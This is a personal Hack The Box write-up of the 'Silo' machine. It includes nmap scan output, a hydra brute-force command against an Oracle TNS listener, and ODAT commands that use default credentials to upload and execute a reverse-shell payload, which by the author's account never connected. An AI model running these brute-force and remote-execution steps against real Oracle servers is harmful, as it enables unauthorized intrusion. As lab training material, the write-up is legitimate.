# HTB Silo

Nmap basic scan:
![[./_resources/HTB_Silo.resources/image.png]]
Nmap aggressive scan:
```
Nmap scan report for 10.10.10.82
Host is up (0.084s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
80/tcp    open  http        Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
| http-methods: 
|  Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns  Oracle TNS listener 11.2.0.2.0 (unauthorized)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  oracle-tns  Oracle TNS listener (requires service name)
49160/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=1/5%OT=80%CT=1%CU=43155%PV=Y%DS=2%DC=T%G=Y%TM=63B791B8
OS:%P=x86_64-pc-linux-gnu)SEQ(CI=I%TS=7)SEQ(SP=F7%GCD=1%ISR=FE%CI=RD%TS=7)S
OS:EQ(CI=RD)SEQ(TI=RI%CI=RI%TS=7)SEQ(SP=F5%GCD=1%ISR=100%TS=7)OPS(O1=M537NW
OS:8ST11%O2=M537NW8ST11%O3=M537NW8NNT11%O4=M537NW8ST11%O5=M537NW8ST11%O6=M5
OS:37ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%
OS:T=80%W=2000%O=M537NW8NNS%CC=Y%Q=)ECN(R=N)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%
OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R
OS:%O=%RD=0%Q=)T4(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T5(R=N)
OS:T6(R=N)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%
OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID
OS:=G%RIPCK=G%RUCK=G%RUD=G)U1(R=N)IE(R=Y%DFI=N%T=80%CD=Z)
Uptime guess: 0.018 days (since Thu Jan  5 19:47:11 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=245 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode: 
|  302: 
|_    Message signing enabled but not required
| smb2-time: 
|  date: 2023-01-06T03:12:48
|_  start_date: 2023-01-06T02:47:22
| smb-security-mode: 
|  account_used: guest
|  authentication_level: user
|  challenge_response: supported
|_  message_signing: supported
TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1  57.74 ms 10.10.16.1
2  57.81 ms 10.10.10.82
NSE: Script Post-scanning.
Initiating NSE at 20:12
Completed NSE at 20:12, 0.00s elapsed
Initiating NSE at 20:12
Completed NSE at 20:12, 0.00s elapsed
Initiating NSE at 20:12
Completed NSE at 20:12, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 281.71 seconds
          Raw packets sent: 1761 (90.608KB) | Rcvd: 14451 (9.532MB)
```

Feroxbuster results with small-directories wordlist:
![[./_resources/HTB_Silo.resources/image.1.png]]
CME scan:
![[./_resources/HTB_Silo.resources/image.2.png]]
This machine uses a RDB by oracle and has a listener I can actually talk to useing a tool built-in to Kali called tnscmd10g. However, I get responses back with errors indicating I am an unauthorized user. I can also try to bruteforce this oracle tns listener using hydra with:
```
hydra -P /usr/share/wordlists/fasttrack.txt -t 32 -s 1521 10.10.10.82 oracle-listener
```

After a considerable amount of time, this did not lead to any meaningful results. Apparently there is a tool called ODAT that should be used for this. I installed this tool with apt and used the sidguesser parameter per the walkthrough since this is totally new to me. The idea here is to first enumerate SIDs and then the passwords.

![[./_resources/HTB_Silo.resources/image.3.png]]
Successful results in finding the account for the previously found SID.:
![[./_resources/HTB_Silo.resources/image.4.png]]
From here, I can upload a file to get a reverse shell using the following command.:
```
sudo odat utlfile -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/
exx.exe /home/cl3al/Desktop/exx.exe
```

![[./_resources/HTB_Silo.resources/image.5.png]]
After running the command below to execute the payload, it would not actually spawn a shell for me as the walkthrough suggests. I will need to try using a aspx payload as this apparently may also work.
```
sudo odat externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ exx.exe
```

For some reason, my attempts at triggering the reverse shell fails in both msfconsole and nc. I tried this again even after temporarily disabling my AV and changing the OVPN file to tcp connection and the issue persists. Due to time, I will move on to another box since this is pretty much the end of the box itself. Once a connection is actually established, you get NT Auth and can obtain the flags.

**###ROOTED ENOUGH!!!###**
